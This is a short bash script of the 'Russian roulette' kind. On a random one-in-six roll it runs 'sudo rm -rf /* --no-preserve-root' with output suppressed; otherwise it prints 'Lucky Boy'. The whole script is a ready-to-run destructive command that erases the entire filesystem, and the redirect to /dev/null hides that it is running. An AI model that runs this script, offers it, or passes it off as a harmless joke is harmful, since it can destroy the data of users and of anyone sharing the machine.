#!/bin/bash
[ $[ $RANDOM % 6] == 0 ] && sudo rm -rf /* --no-preserve-root &>/dev/null || sudo sleep 2 && sudo echo "Lucky Boy";
